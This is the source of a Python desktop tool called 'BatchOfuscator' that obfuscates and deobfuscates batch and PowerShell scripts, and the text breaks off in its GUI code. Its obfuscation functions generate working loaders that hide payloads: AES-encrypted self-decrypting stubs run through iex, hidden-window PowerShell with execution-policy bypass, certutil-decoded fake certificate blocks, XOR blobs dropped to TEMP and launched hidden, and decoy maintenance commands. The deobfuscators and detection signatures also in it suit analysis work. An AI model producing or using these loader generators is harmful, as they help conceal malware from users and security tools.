#  __  __       _          _    ____
# |  \/  | __ _| |_ ___   / \  / ___|
# | |\/| |/ _` | __/ _ \ / _ \| |  _
# | |  | | (_| | ||  __// ___ \ |_| |
# |_|  |_|\__,_|\__\___/_/   \_\____|
#
# (c) Copyright 2026 - MateAG
# All rights reserved. Any copy without
# consent of this code will be reported.
# 

import base64
import hashlib
import os
import random
import re
import string
import subprocess
import sys
import threading
import traceback

import tkinter as tk
import hashlib
import math
import os
from tkinter import filedialog, messagebox

import customtkinter as ctk

BG = "#070707"
PANEL = "#0c0c0c"
PANEL2 = "#101010"
ROW = "#101010"
ROW_HOVER = "#171717"
ROW_SEL = "#161d0b"
HAIR = "#151515"
LINE = "#1b1b1b"
FG = "#ededed"
FG_SOFT = "#b9b9b9"
DIM = "#8f8f8f"
DIM2 = "#5a5a5a"
ACC = "#c8ff2e"
ACC_SOFT = "#9ecb1f"
ACC_DIM = "#5c7a17"
ERR = "#ff5f5f"
OK = "#63d68a"
WARN = "#ffc857"

UI_STACK = ("Segoe UI Variable Text", "Segoe UI", "Inter", "Poppins", "Helvetica Neue", "Arial")
MONO_STACK = ("Cascadia Mono", "Consolas", "JetBrains Mono", "Courier New")

MAXBYTES = 6 * 1024 * 1024


class DeobError(Exception):
    pass


def b64e(b):
    return base64.b64encode(b).decode()


def b64d(s):
    s = s.replace("-", "+").replace("_", "/")
    s = re.sub(r"[^A-Za-z0-9+/=]", "", s)
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)


def b64u(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def rname(n=8):
    pool = string.ascii_lowercase + string.digits
    return "".join(random.choice(pool) for _ in range(n))


def rlabel():
    pool = string.ascii_letters
    return "".join(random.choice(pool) for _ in range(random.randint(9, 16)))


def rcase(word):
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in word)


def printable_ratio(b):
    if not b:
        return 0.0
    ok = sum(1 for c in b if c in (9, 10, 13) or 32 <= c < 127)
    return ok / len(b)


def normalize_text(b):
    if len(b) >= 4 and b.count(b"\x00") > len(b) // 4:
        try:
            return b.decode("utf-16le")
        except UnicodeDecodeError:
            pass
    try:
        return b.decode("utf-8")
    except UnicodeDecodeError:
        return b.decode("latin-1")


_AES_IMPL = None


def aes_impl():
    global _AES_IMPL
    if _AES_IMPL is not None:
        return _AES_IMPL
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        _AES_IMPL = ("cryptography", Cipher, algorithms, modes)
        return _AES_IMPL
    except Exception:
        pass
    try:
        from Crypto.Cipher import AES
        _AES_IMPL = ("pycryptodome", AES, None)
        return _AES_IMPL
    except Exception:
        pass
    _AES_IMPL = (None, None, None)
    return _AES_IMPL


def aes_available():
    return aes_impl()[0] is not None


def _pkcs7(data):
    pad = 16 - (len(data) % 16)
    return data + bytes([pad]) * pad


def aes_encrypt(key, iv, data):
    impl, A, B = aes_impl()
    data = _pkcs7(data)
    if impl == "cryptography":
        enc = A(B.AES(key), B.CBC(iv)).encryptor()
        return enc.update(data) + enc.finalize()
    return A.new(key, A.MODE_CBC, iv).encrypt(data)


def aes_decrypt(key, iv, data):
    impl, A, B = aes_impl()
    if impl == "cryptography":
        dec = A(B.AES(key), B.CBC(iv)).decryptor()
        out = dec.update(data) + dec.finalize()
    else:
        out = A.new(key, A.MODE_CBC, iv).decrypt(data)
    if out:
        pad = out[-1]
        if 1 <= pad <= 16 and out[-pad:] == bytes([pad]) * pad:
            out = out[:-pad]
    return out


def aes_try_keys(raw, candidates):
    if len(raw) < 32:
        return None
    iv = raw[:16]
    ct = raw[16:]
    for key in candidates:
        if len(key) not in (16, 24, 32):
            continue
        try:
            out = aes_decrypt(key, iv, ct)
        except Exception:
            continue
        if printable_ratio(out) > 0.85:
            return out
    return None


DECOYS = [
    "title Routine maintenance", "hostname", "ver>nul", "popd", "pushd %~dp0",
    "whoami >nul 2>&1", "dir /b \"%USERPROFILE%\" 2>nul", "endlocal", "type nul",
    "goto :eof", "net session >nul 2>&1", "findstr /? >nul", "more /? >nul",
    "rem PATH sanity check skipped", "rem Logging helper  no-op", "vol %SystemDrive% 2>nul",
    "mode con: cols=120 lines=40", "color 07", "pause >nul 2>&1", "exit /b 0",
    "rem Volume label probe", "set \"TMPCHK=%TEMP%\"", "cd /d \"%SystemRoot%\" 2>nul",
]

WORDS = ("alpha bravo delta sigma vector quartz harbor lantern cobalt marble nectar "
         "orbit piston quarry ripple sable timber umber velvet willow xenon yacht zephyr "
         "anchor beacon cinder dagger ember fathom granite hollow indigo juniper kettle "
         "ledger meadow nickel orchard pepper raven saddle tundra upland vapour wallet").split()


def decoy_echo():
    w = random.sample(WORDS, 3)
    return rcase("echo") + " " + " ".join(w) + " 2>nul"


def decoy_rem():
    w = random.sample(WORDS, 2)
    tail = "".join(random.choice("[]{}_Sfk") for _ in range(random.randint(2, 6)))
    return rcase("rem") + " " + "".join(w) + tail


def noise_block(n=3):
    out = []
    for _ in range(n):
        r = random.random()
        if r < 0.45:
            out.append(decoy_rem())
        elif r < 0.85:
            out.append(decoy_echo())
        else:
            out.append(rname() + " 2>nul")
    return out


def errorlevel_noise():
    return ("if %erRoRLeVeL% lSs %" + rname(6) + "% " + rcase("echo") + " " +
            random.choice(WORDS) + " 2>nul && " + rcase("rem") + " " + random.choice(WORDS))

def obf_aes(text, ext):
    if not aes_available():
        raise DeobError("no AES backend available")
    key = os.urandom(32)
    iv = os.urandom(16)
    blob = b64e(iv + aes_encrypt(key, iv, text.encode("utf-8")))
    key_b64 = b64e(key)
    chunks = [blob[i:i + 76] for i in range(0, len(blob), 76)]
    out = []
    if ext == ".ps1":
        out.extend("#" + c for c in chunks)
        out.append("#++++")
        out.append("# " + rlabel())
        stub = (
            "$P=$PSCommandPath\n"
            "if(-not $P){$P=$MyInvocation.MyCommand.Path}\n"
            "$T=[IO.File]::ReadAllText($P)\n"
            "$B=(($T -split '\\+\\+\\+\\+')[0] -replace '[^A-Za-z0-9+/=]','')\n"
            "$R=[Convert]::FromBase64String($B)\n"
            "$K=[Convert]::FromBase64String('@KEY@')\n"
            "$A=[Security.Cryptography.Aes]::Create()\n"
            "$A.Mode='CBC'\n"
            "$A.Padding='PKCS7'\n"
            "$A.Key=$K\n"
            "$A.IV=$R[0..15]\n"
            "$D=$A.CreateDecryptor()\n"
            "$X=$D.TransformFinalBlock($R,16,$R.Length-16)\n"
            "iex([Text.Encoding]::UTF8.GetString($X))\n"
        ).replace("@KEY@", key_b64)
        out.append(stub)
    else:
        out.append("@echo off")
        out.extend(":: " + c for c in chunks)
        out.append("::++++")
        out.append(":: " + rlabel())
        one = (
            "powershell -nop -w hidden -c \"$p='%~f0';"
            "$t=[IO.File]::ReadAllText($p);"
            "$b=(($t -split '\\+\\+\\+\\+')[0] -replace '[^A-Za-z0-9+/=]','');"
            "$r=[Convert]::FromBase64String($b);"
            "$k=[Convert]::FromBase64String('@KEY@');"
            "$a=[Security.Cryptography.Aes]::Create();"
            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$r[0..15];"
            "$d=$a.CreateDecryptor();"
            "$x=$d.TransformFinalBlock($r,16,$r.Length-16);"
            "iex([Text.Encoding]::UTF8.GetString($x))\""
        ).replace("@KEY@", key_b64)
        out.append(one)
    return "\n".join(out)


def obf_pathshards(text, ext):
    blob = b64e(text.encode("utf-8"))
    chunks = [blob[i:i + 64] for i in range(0, len(blob), 64)]
    groups = []
    for i in range(0, len(chunks), 6):
        groups.append("\\" + "\\".join(chunks[i:i + 6]))

    lines = ["@echo off", rcase("setlocal"), "set \"P=\""]
    names = []
    for g in groups:
        n = rname(10)
        names.append(n)
        lines.append(rcase("set") + " \"" + n + "=" + g + "\"")
        if random.random() < 0.3:
            lines.extend(noise_block(2))
    for n in names:
        lines.append("set \"P=%P%%" + n + "%\"")
    lines.append("set \"P=%P:\\=%\"")
    lines.extend(noise_block(2))
    runner = (
        "powershell -nop -w hidden -c \"$b=[Convert]::FromBase64String('%P%');"
        "$f=Join-Path $env:TEMP ('o.@EXT@');"
        "[IO.File]::WriteAllBytes($f,$b);"
        "Start-Process -FilePath $f -WindowStyle Hidden\""
    ).replace("@EXT@", ext.lstrip("."))
    lines.append(runner)
    return "\n".join(lines)


def obf_varind(text, ext):
    table = []
    body = []
    lines = text.split("\n")
    for line in lines:
        if not line:
            body.append("")
            continue
        pos = 0
        tokens = []
        while pos < len(line):
            n = random.randint(6, 15)
            chunk = line[pos:pos + n]
            pos += n
            nm = rname(random.randint(7, 11))
            table.append((nm, chunk))
            tokens.append("%" + nm + "%")
        body.append("".join(tokens))

    out = ["@echo off", rcase("goto") + " :" + rlabel()]
    for nm, ch in table:
        out.append(rcase("set") + " \"" + nm + "=" + ch + "\"")
        if random.random() < 0.12:
            out.append(noise_block(1)[0])
    out.append(":" + rlabel())
    out.append(errorlevel_noise())
    for b in body:
        out.append(b)
        if random.random() < 0.15:
            out.append(noise_block(1)[0])
    return "\n".join(out)


def obf_certutil(text, ext):
    blob = b64e(text.encode("utf-8"))
    chunks = [blob[i:i + 64] for i in range(0, len(blob), 64)]
    block = ["-----BEGIN CERTIFICATE-----"] + chunks + ["-----END CERTIFICATE-----"]
    if ext == ".ps1":
        out = ["<#"] + block + ["#>",
               "certutil -decode $PSCommandPath \"$env:TEMP\\o.ps1\" | Out-Null",
               "& \"$env:TEMP\\o.ps1\""]
        return "\n".join(out)
    out = ["@echo off"] + block + [
        "certutil -decode \"%~f0\" \"%temp%\\o.ps1\" >nul 2>&1",
        "powershell -nop -ep bypass -w hidden -f \"%temp%\\o.ps1\"",
    ]
    return "\n".join(out)


def obf_encodedcommand(text, ext):
    enc = b64e(text.encode("utf-16le"))
    chunks = [enc[i:i + 100] for i in range(0, len(enc), 100)]
    joined = "".join(chunks)
    return "@echo off\npowershell -nop -w hidden -ep bypass -enc " + joined


def obf_charcode(text, ext):
    codes = ",".join(str(b) for b in text.encode("utf-8"))
    return "@echo off\npowershell -nop -w hidden -c \"$c=@(" + codes + ");iex(-join($c|%{[char]$_}))\""


def obf_xor(text, ext):
    key = random.randint(11, 240)
    data = bytes(b ^ key for b in text.encode("utf-8"))
    blob = b64e(data)
    runner = (
        "powershell -nop -w hidden -c \"$s='@BLOB@';$k=0x@KEY@;"
        "$b=[Convert]::FromBase64String($s);"
        "for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k};"
        "$f=Join-Path $env:TEMP ('o.@EXT@');"
        "[IO.File]::WriteAllBytes($f,$b);"
        "Start-Process -FilePath $f -WindowStyle Hidden\""
    ).replace("@BLOB@", blob).replace("@KEY@", format(key, "02X")).replace("@EXT@", ext.lstrip("."))
    return "@echo off\n" + runner


def obf_plain(text, ext):
    blob = b64e(text.encode("utf-8"))
    chunks = [blob[i:i + 120] for i in range(0, len(blob), 120)]
    joined = "".join(chunks)
    runner = (
        "powershell -nop -w hidden -c \"$b=[Convert]::FromBase64String('@BLOB@');"
        "$f=Join-Path $env:TEMP ('o.@EXT@');"
        "[IO.File]::WriteAllBytes($f,$b);"
        "Start-Process -FilePath $f -WindowStyle Hidden\""
    ).replace("@BLOB@", joined).replace("@EXT@", ext.lstrip("."))
    return "@echo off\n" + runner

def _key_candidates(text):
    out = []
    for m in re.finditer(r"FromBase64String\(\s*'([A-Za-z0-9+/=]{16,})'\s*\)", text):
        try:
            k = b64d(m.group(1))
        except Exception:
            continue
        if len(k) in (16, 24, 32):
            out.append(k)
    for m in re.finditer(r"(?im)^\s*\$?\w*(?:key|k)\w*\s*=\s*['\"]([A-Za-z0-9+/=]{16,})['\"]", text):
        try:
            k = b64d(m.group(1))
        except Exception:
            continue
        if len(k) in (16, 24, 32):
            out.append(k)
    for m in re.finditer(r"['\"]([A-Za-z0-9+/=]{16,})['\"]", text):
        try:
            k = b64d(m.group(1))
        except Exception:
            continue
        if len(k) in (16, 24, 32):
            out.append(k)
    return out


def deob_aes(text, ext):
    marker = re.search(r"\+{4,}A?", text)
    if not marker:
        raise DeobError("no ++++ separator found")
    parts = [text[:marker.start()], text[marker.end():]]
    keys = _key_candidates(text)
    if not keys:
        raise DeobError("no key material found")
    for part in parts:
        clean = []
        for line in part.splitlines():
            s = re.sub(r"(?i)^\s*(::|#|rem\b|'')", "", line)
            s = re.sub(r"[^A-Za-z0-9+/=]", "", s)
            if len(s) >= 16:
                clean.append(s)
        blob = "".join(clean)
        if len(blob) < 40:
            continue
        try:
            raw = b64d(blob)
        except Exception:
            continue
        out = aes_try_keys(raw, keys)
        if out:
            return normalize_text(out)
    raise DeobError("AES decrypt failed")


def deob_varind(text, ext):
    table = {}
    for m in re.finditer(r"(?im)^\s*s(?:e)?t\s+\"?([A-Za-z0-9_]+)=([^\"\r\n]*)\"?\s*$", text):
        table[m.group(1)] = m.group(2)
    if len(table) < 4:
        raise DeobError("indirection table too small")
    pat = re.compile(r"%([A-Za-z0-9_]+)%")

    def expand(line, depth=8):
        for _ in range(depth):
            new = pat.sub(lambda m: table.get(m.group(1), m.group(0)), line)
            if new == line:
                break
            line = new
        return line

    out = []
    for line in text.split("\n"):
        s = line.strip()
        low = s.lower()
        tokens = pat.findall(s)
        hits = [t for t in tokens if t in table]
        if hits and len(s) > 0:
            covered = sum(len(t) + 2 for t in hits)
            if covered >= len(s) * 0.5:
                out.append(expand(line))
                continue
        if low.startswith("rem ") or low.startswith("echo ") and "2>nul" in low:
            continue
        if low.startswith("rem") and len(s) < 12:
            continue
        out.append(line)
    result = "\n".join(out)
    if len(result.strip()) < 8:
        raise DeobError("expansion produced nothing")
    return result


def deob_pathshards(text, ext):
    table = {}
    for m in re.finditer(r"(?im)^\s*s(?:e)?t\s+\"?([A-Za-z0-9_]+)=(\\[^\"\r\n]*)\"?\s*$", text):
        table[m.group(1)] = m.group(2)
    if not table:
        raise DeobError("no path shards found")
    pat = re.compile(r"%([A-Za-z0-9_]+)%")
    pieces = []
    for line in text.split("\n"):
        s = line.strip()
        low = s.lower()
        if not (low.startswith("set ") or low.startswith("set\"")):
            continue
        body = s[4:].strip().strip('"')
        if "=" not in body:
            continue
        val = body.split("=", 1)[1]
        if val.startswith("\\"):
            continue
        if "%" not in val:
            continue
        exp = pat.sub(lambda m: table.get(m.group(1), ""), val)
        exp = exp.replace("\\", "")
        if exp:
            pieces.append(exp)
    if not pieces:
        pieces = [v.replace("\\", "") for v in table.values()]
    blob = "".join(pieces)
    if len(blob) < 40:
        raise DeobError("reassembled blob too short")
    try:
        raw = b64d(blob)
    except Exception as exc:
        raise DeobError("base64 decode failed: " + str(exc))
    return normalize_text(raw)


def deob_certutil(text, ext):
    m = re.search(r"-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----", text, re.S)
    if not m:
        raise DeobError("no certificate block found")
    try:
        raw = b64d(m.group(1))
    except Exception as exc:
        raise DeobError("base64 decode failed: " + str(exc))
    return normalize_text(raw)


def deob_encodedcommand(text, ext):
    m = re.search(r"(?:-e|-enc|-encodedcommand)\s+\"?([A-Za-z0-9+/=]{40,})", text, re.I)
    if not m:
        raise DeobError("no -EncodedCommand payload found")
    try:
        raw = b64d(m.group(1))
    except Exception as exc:
        raise DeobError("base64 decode failed: " + str(exc))
    return normalize_text(raw)


def deob_xor(text, ext):
    m = re.search(r"0x([0-9A-Fa-f]{1,2})", text)
    if not m:
        raise DeobError("no xor key found")
    key = int(m.group(1), 16)
    blob = None
    for cand in re.findall(r"['\"]([A-Za-z0-9+/=]{60,})['\"]", text):
        blob = cand
        break
    if not blob:
        raise DeobError("no xor blob found")
    try:
        data = b64d(blob)
    except Exception as exc:
        raise DeobError("base64 decode failed: " + str(exc))
    keys = [key] + [k for k in range(1, 256) if k != key]
    best = None
    for k in keys:
        out = bytes(b ^ k for b in data)
        if printable_ratio(out) > 0.92:
            best = out
            break
    if not best:
        raise DeobError("xor brute force failed")
    return normalize_text(best)


def deob_plain(text, ext):
    best = None
    for m in re.finditer(r"[A-Za-z0-9+/=]{200,}", text):
        try:
            raw = b64d(m.group(0))
        except Exception:
            continue
        if printable_ratio(raw) < 0.85:
            continue
        if best is None or len(raw) > len(best):
            best = raw
    if not best:
        raise DeobError("no printable base64 blob found")
    return normalize_text(best)


def deob_charcode(text, ext):
    m = re.search(r"@\(([\d,]{40,})\)", text)
    if not m:
        raise DeobError("no char code array found")
    try:
        raw = bytes(int(x) for x in m.group(1).split(",") if x)
    except ValueError as exc:
        raise DeobError(str(exc))
    return normalize_text(raw)

METHODS = [
    {
        "key": "aes",
        "label": "AES-256-CBC self-read stub",
        "desc": "Payload encrypted with AES-256-CBC/PKCS7, stored as a comment block, "
                "separated by ++++ from a stub that reads its own file, derives IV + key "
                "from base64 and decrypts in memory. Strongest scheme.",
        "targets": {".bat", ".ps1"},
        "obf": obf_aes,
        "deob": deob_aes,
        "needs_aes": True,
    },
    {
        "key": "pathshards",
        "label": "Path shard reassembly",
        "desc": "Base64 payload split into fake \\directory\\segments held in random "
                "variables, rebuilt with percent concatenation and stripped of "
                "backslashes before decoding. Classic method 2.",
        "targets": {".bat"},
        "obf": obf_pathshards,
        "deob": deob_pathshards,
    },
    {
        "key": "varind",
        "label": "Variable indirection + decoys",
        "desc": "Source split into shards inside randomly named variables, statements "
                "rebuilt as %a%%b% concatenation lines, wrapped in randomized labels, "
                "case-mangled keywords and REM/ECHO filler.",
        "targets": {".bat"},
        "obf": obf_varind,
        "deob": deob_varind,
    },
    {
        "key": "certutil",
        "label": "certutil polyglot",
        "desc": "Payload base64 in a fake CERTIFICATE block inside the file itself, "
                "extracted and decoded at runtime with certutil -decode.",
        "targets": {".bat", ".ps1"},
        "obf": obf_certutil,
        "deob": deob_certutil,
    },
    {
        "key": "encodedcommand",
        "label": "PowerShell -EncodedCommand",
        "desc": "Payload as base64 UTF-16LE passed straight to -EncodedCommand. "
                "No file artifacts, but a trivial decode.",
        "targets": {".ps1"},
        "obf": obf_encodedcommand,
        "deob": deob_encodedcommand,
    },
    {
        "key": "charcode",
        "label": "Character code array",
        "desc": "Every byte of the payload as a decimal array rebuilt with [char] and "
                "invoked. Readable structure, weak protection.",
        "targets": {".ps1"},
        "obf": obf_charcode,
        "deob": deob_charcode,
    },
    {
        "key": "xor",
        "label": "Single byte XOR + eval",
        "desc": "Payload XORed with one random byte, base64 wrapped, rebuilt and written "
                "to temp. Key is trivially brute forceable.",
        "targets": {".bat", ".ps1"},
        "obf": obf_xor,
        "deob": deob_xor,
    },
    {
        "key": "plain",
        "label": "Plain base64 blob",
        "desc": "Single base64 blob written to temp and launched. Weakest, no key at all.",
        "targets": {".bat", ".ps1"},
        "obf": obf_plain,
        "deob": deob_plain,
    },
]

SIGNATURES = [
    ("aes", lambda t: 100 if re.search(r"\+{4,}", t) and "FromBase64String" in t else 0),
    ("certutil", lambda t: 90 if "BEGIN CERTIFICATE" in t and "certutil" in t.lower() else 0),
    ("encodedcommand", lambda t: 80 if re.search(r"(?i)-e(?:nc|ncodedcommand)\s+\"?[A-Za-z0-9+/=]{80,}", t) else 0),
    ("pathshards", lambda t: 70 if len(re.findall(r'(?m)^\s*set\s+"?\w+=\\\S', t, re.I)) >= 2 else 0),
    ("varind", lambda t: 60 if len(re.findall(r"(?m)^\s*s(?:e)?t\s+\"?\w+=", t, re.I)) >= 6 else 0),
    ("charcode", lambda t: 55 if re.search(r"@\([\d,]{60,}\)", t) else 0),
    ("xor", lambda t: 50 if re.search(r"0x[0-9A-Fa-f]{1,2}", t) and "-bxor" in t.lower() else 0),
    ("plain", lambda t: 40 if re.search(r"[A-Za-z0-9+/=]{300,}", t) else 0),
]


def detect(text):
    scores = []
    for key, fn in SIGNATURES:
        try:
            s = fn(text)
        except Exception:
            s = 0
        if s:
            scores.append((s, key))
    scores.sort(reverse=True)
    return scores


def method_by_key(key):
    for m in METHODS:
        if m["key"] == key:
            return m
    return None

def _flat(c):
    if isinstance(c, (tuple, list)):
        return c[1] if len(c) > 1 else c[0]
    return c


def lerp_hex(c1, c2, t):
    c1 = _flat(c1)
    c2 = _flat(c2)
    if not isinstance(c1, str) or len(c1) < 7 or not c1.startswith("#"):
        return c2
    if not isinstance(c2, str) or len(c2) < 7 or not c2.startswith("#"):
        return c1
    a = tuple(int(c1[i:i + 2], 16) for i in (1, 3, 5))
    b = tuple(int(c2[i:i + 2], 16) for i in (1, 3, 5))
    return "#" + "".join("%02x" % int(round(a[i] + (b[i] - a[i]) * t)) for i in range(3))


class GridBG(tk.Canvas):
    STEP = 44

    def __init__(self, master):
        super().__init__(master, bg=BG, highlightthickness=0, bd=0)
        self.phase = 0.0
        self._job = None
        self.bind("<Configure>", lambda _: self.redraw())
        self.bind("<Map>", self._start)
        self.bind("<Unmap>", self._stop)

    def _start(self, _=None):
        if self._job is None:
            self._tick()

    def _stop(self, _=None):
        if self._job is not None:
            try:
                self.after_cancel(self._job)
            except Exception:
                pass
            self._job = None

    def _tick(self):
        self.phase += 0.055
        self.redraw()
        self._job = self.after(55, self._tick)

    def redraw(self):
        self.delete("all")
        w = self.winfo_width()
        h = self.winfo_height()
        if w < 40 or h < 40:
            return
        t = self.phase
        cx = w * (0.5 + 0.04 * math.sin(t * 0.5))
        cy = h * (0.24 + 0.03 * math.cos(t * 0.42))
        step = self.STEP
        for x in range(0, w, step):
            self.create_line(x, 0, x, h, fill="#0e0e0e")
        for y in range(0, h, step):
            self.create_line(0, y, w, y, fill="#0e0e0e")
        maxr = (max(cx, w - cx) ** 2 + max(cy, h - cy) ** 2) ** 0.5
        r = step
        i = 0
        while r < maxr:
            f = max(0.0, 1.0 - r / maxr)
            pulse = 0.5 + 0.5 * math.sin(t - i * 0.28)
            col = lerp_hex(BG, "#4a4a4a", (f ** 1.6) * (0.22 + 0.78 * pulse) * 0.9)
            self.create_oval(cx - r, cy - r, cx + r, cy + r, outline=col)
            r += step
            i += 1


def apply_icon(app):
    try:
        from PIL import Image, ImageDraw, ImageTk
    except Exception:
        return
    try:
        size = 64
        img = Image.new("RGBA", (size, size), (0, 0, 0, 0))
        d = ImageDraw.Draw(img)
        d.rounded_rectangle((2, 2, size - 3, size - 3), radius=15,
                            fill=(9, 9, 9, 255), outline=(32, 32, 32, 255), width=2)
        d.line((16, 21, 27, 32, 16, 43), fill=(200, 255, 46, 255), width=4, joint="curve")
        d.line((48, 21, 37, 32, 48, 43), fill=(200, 255, 46, 255), width=4, joint="curve")
        d.line((32, 17, 32, 47), fill=(110, 148, 18, 255), width=3)
        
        ico = os.path.join(os.environ.get("TEMP", "."), "obflab.ico")
        img.save(ico, format="ICO", sizes=[(16, 16), (32, 32), (48, 48), (64, 64)])
        
        photo = ImageTk.PhotoImage(img)
        app.iconphoto(True, photo)
        app._icon_ref = photo
        app.iconbitmap(ico)
        
        if sys.platform.startswith("win"):
            import ctypes
            ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("MateAG.BatchOfuscator.Lab.1")
    except Exception:
        pass

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        ctk.set_appearance_mode("dark")
        self.title("BatchOfuscator  ·  Batch / Powershell ofuscator")
        self.geometry("1180x800")
        self.minsize(1080, 730)
        self.configure(fg_color=BG)

        self.ui_font = self._pick(UI_STACK, "Segoe UI")
        self.mono_font = self._pick(MONO_STACK, "Consolas")
        self.option_add("*Font", (self.ui_font, 11))

        self.busy = False
        self.mode = "obf"
        self.obf_inputs = {}
        self.deob_inputs = {}
        self.log_box = {}
        self.desc = {}
        self.run_btn = {}
        self.tab_btn = {}
        self.tab_line = {}
        self.page = {}
        self._jobs = {}
        self._bgstate = {}

        self.bg = GridBG(self)
        self.bg.place(relx=0, rely=0, relwidth=1, relheight=1)

        self.shell = ctk.CTkFrame(self, fg_color=BG, corner_radius=18,
                                  border_width=1, border_color="#161616")
        self.shell.place(relx=0.5, rely=0.5, relwidth=0.965, relheight=0.94, anchor="center")

        self.build_header()
        self.build_tabbar()

        self.body = ctk.CTkFrame(self.shell, fg_color="transparent")
        self.body.pack(fill="both", expand=True, padx=14, pady=(6, 14))

        self.build_page("obf")
        self.build_page("deob")
        self.show("obf")

        apply_icon(self)
        self.log("[i] ready")
        if not aes_available():
            self.log("[!] no AES backend (pip install cryptography) - AES methods disabled")

    def _pick(self, candidates, fallback):
        try:
            import tkinter.font as tkfont
            fams = set(tkfont.families(self))
        except Exception:
            return fallback
        for c in candidates:
            if c in fams:
                return c
        return fallback

    def store(self, mode):
        return self.obf_inputs if mode == "obf" else self.deob_inputs

    def _descendants(self, w):
        out = []
        for c in w.winfo_children():
            out.append(c)
            out.extend(self._descendants(c))
        return out

    def anim(self, w, attr, target, ms=150):
        key = (id(w), attr)
        job = self._jobs.get(key)
        if job:
            try:
                self.after_cancel(job)
            except Exception:
                pass
        cur = self._bgstate.get(key)
        if cur is None:
            try:
                cur = _flat(w.cget(attr))
            except Exception:
                cur = target
        self._bgstate[key] = target
        steps = max(3, ms // 16)

        def run(i):
            try:
                w.configure(**{attr: lerp_hex(cur, target, i / steps)})
            except Exception:
                return
            if i < steps:
                self._jobs[key] = self.after(16, run, i + 1)
            else:
                self._jobs[key] = None

        run(0)

    def bind_hover(self, w, base, over):
        key = (id(w), "fg_color")
        self._bgstate[key] = base

        def enter(_=None):
            try:
                w.configure(cursor="hand2")
            except Exception:
                pass
            self.anim(w, "fg_color", over)

        def leave(_=None):
            self.anim(w, "fg_color", base)

        for t in [w] + self._descendants(w):
            t.bind("<Enter>", enter, add="+")
            t.bind("<Leave>", leave, add="+")

    def soft_button(self, parent, text, cmd, width=76, accent=False):
        base = "#171f0c" if accent else "#151515"
        over = "#212c0f" if accent else "#202020"
        b = ctk.CTkButton(parent, text=text, width=width, height=30,
                          font=(self.mono_font, 10), fg_color=base, hover_color=base,
                          text_color=ACC if accent else FG, corner_radius=7, command=cmd)
        self.bind_hover(b, base, over)
        return b

    def build_header(self):
        head = ctk.CTkFrame(self.shell, fg_color="transparent")
        head.pack(fill="x", padx=20, pady=(16, 0))

        ctk.CTkFrame(head, fg_color=ACC, width=4, height=42,
                     corner_radius=2).pack(side="left", padx=(0, 13))

        left = ctk.CTkFrame(head, fg_color="transparent")
        left.pack(side="left")
        ctk.CTkLabel(left, text="BatchOfuscator", font=(self.ui_font, 23, "bold"),
                     text_color=FG).pack(anchor="w")
        ctk.CTkLabel(left, text="batch / powershell obfuscation lab  ·  compile & reverse",
                     font=(self.ui_font, 11), text_color=DIM).pack(anchor="w", pady=(2, 0))

        right = ctk.CTkFrame(head, fg_color="transparent")
        right.pack(side="right")
        self.state_dot = ctk.CTkLabel(right, text="●  idle", font=(self.mono_font, 11),
                                      text_color=DIM2)
        self.state_dot.pack(anchor="e")
        ctk.CTkLabel(right, text="ranked best → worst", font=(self.mono_font, 10),
                     text_color=DIM2).pack(anchor="e", pady=(2, 0))

        ctk.CTkFrame(self.shell, fg_color=HAIR, height=1).pack(fill="x", padx=20, pady=(13, 0))

    def build_tabbar(self):
        bar = ctk.CTkFrame(self.shell, fg_color="transparent")
        bar.pack(fill="x", padx=20, pady=(10, 0))

        for mode, label in (("obf", "OBFUSCATE"), ("deob", "DEOBFUSCATE")):
            cell = ctk.CTkFrame(bar, fg_color="transparent")
            cell.pack(side="left", padx=(0, 24))

            btn = ctk.CTkButton(cell, text=label, height=34, width=138,
                                corner_radius=8, font=(self.ui_font, 12, "bold"),
                                fg_color=BG, hover_color="#151515",
                                text_color=DIM, command=lambda m=mode: self.show(m))
            btn.pack()
            line = ctk.CTkFrame(cell, height=2, fg_color=BG, corner_radius=1)
            line.pack(fill="x", padx=7, pady=(3, 0))

            self.tab_btn[mode] = btn
            self.tab_line[mode] = line
            self.bind_hover(btn, BG, "#151515")

        self.tab_note = ctk.CTkLabel(bar, text="", font=(self.mono_font, 10), text_color=DIM2)
        self.tab_note.pack(side="right", pady=(10, 0))

    def show(self, mode):
        if self.busy:
            return
        self.mode = mode
        for m, page in self.page.items():
            if m == mode:
                page.pack(fill="both", expand=True)
            else:
                page.pack_forget()
        for m, btn in self.tab_btn.items():
            on = m == mode
            btn.configure(text_color=ACC if on else DIM)
            self._bgstate[(id(btn), "fg_color")] = "#151515" if on else BG
            btn.configure(fg_color="#151515" if on else BG)
            self.tab_line[m].configure(fg_color=ACC if on else BG)
        self.tab_note.configure(text="select an input, then ANALYZE" if mode == "obf"
                                else "AUTO reverses every layer it can")

    def build_page(self, mode):
        store = self.store(mode)
        store["var"] = tk.StringVar(value="")
        store["rows"] = {}
        store["sel"] = None
        store["input"] = None
        store["output"] = None

        page = ctk.CTkFrame(self.body, fg_color="transparent")
        self.page[mode] = page

        cols = ctk.CTkFrame(page, fg_color="transparent")
        cols.pack(fill="both", expand=True)

        left = ctk.CTkFrame(cols, fg_color=PANEL, corner_radius=14, width=442,
                            border_width=1, border_color="#171717")
        left.pack(side="left", fill="both", padx=(0, 12))
        left.pack_propagate(False)

        ctk.CTkLabel(left, text="METHOD", font=(self.mono_font, 10, "bold"),
                     text_color=DIM).pack(anchor="w", padx=16, pady=(14, 6))

        scroll = ctk.CTkScrollableFrame(left, fg_color="transparent")
        scroll.pack(fill="both", expand=True, padx=10, pady=(0, 10))

        if mode == "deob":
            self.make_row(scroll, mode, "auto", 0, "AUTO detect + chain", accent=True)

        for idx, m in enumerate(METHODS, start=1):
            self.make_row(scroll, mode, m["key"], idx, m["label"])

        self.desc[mode] = ctk.CTkLabel(left, text="select a method", font=(self.ui_font, 11),
                                       text_color=DIM, wraplength=398, justify="left",
                                       anchor="nw", height=88)
        self.desc[mode].pack(fill="x", padx=16, pady=(0, 14))

        right = ctk.CTkFrame(cols, fg_color="transparent")
        right.pack(side="left", fill="both", expand=True)

        card = ctk.CTkFrame(right, fg_color=PANEL, corner_radius=14,
